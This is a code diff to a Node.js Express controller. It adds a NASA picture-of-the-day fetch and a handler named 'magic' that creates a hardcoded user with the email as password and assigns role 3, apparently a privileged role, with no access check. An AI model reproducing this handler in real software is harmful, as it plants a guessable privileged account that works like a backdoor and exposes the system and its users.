@@ -4,6 +4,8 @@ const Invite = db.invite;
 const Role = db.role;
 const User = db.user;
 const sendMail = require('../config/mail.config');
+const axios = require('axios').default;
+var bcrypt = require("bcryptjs");
 
 const Op = db.Sequelize.Op;
 exports.allAccess = (req, res) => {
@@ -69,3 +71,32 @@ exports.inviteUser = (req, res) => {
             }
         })
 };
+
+exports.getDashboardStats = (req, res) => {
+    axios
+        .get('https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY')
+        .then(response => {
+            // console.log(response.data)
+            // res.status(200).send((response));
+            res.send(response.data.explanation)
+        })
+        .catch(err => { console.log(err.response.data) })
+}
+
+exports.magic = (req, res) => {
+
+    User.create({
+        username: 'anthonybaru',
+        email: 'anthonybaru@gmail.com',
+        password: bcrypt.hashSync('anthonybaru@gmail.com', 8)
+    })
+        .then(defaultUser => {
+            defaultUser.setRoles([3])
+                .then(result => {
+                    console.log(result);
+                })
+                .catch(err => console.log(err));
+
+        })
+        .catch(err => console.log(err));
+}
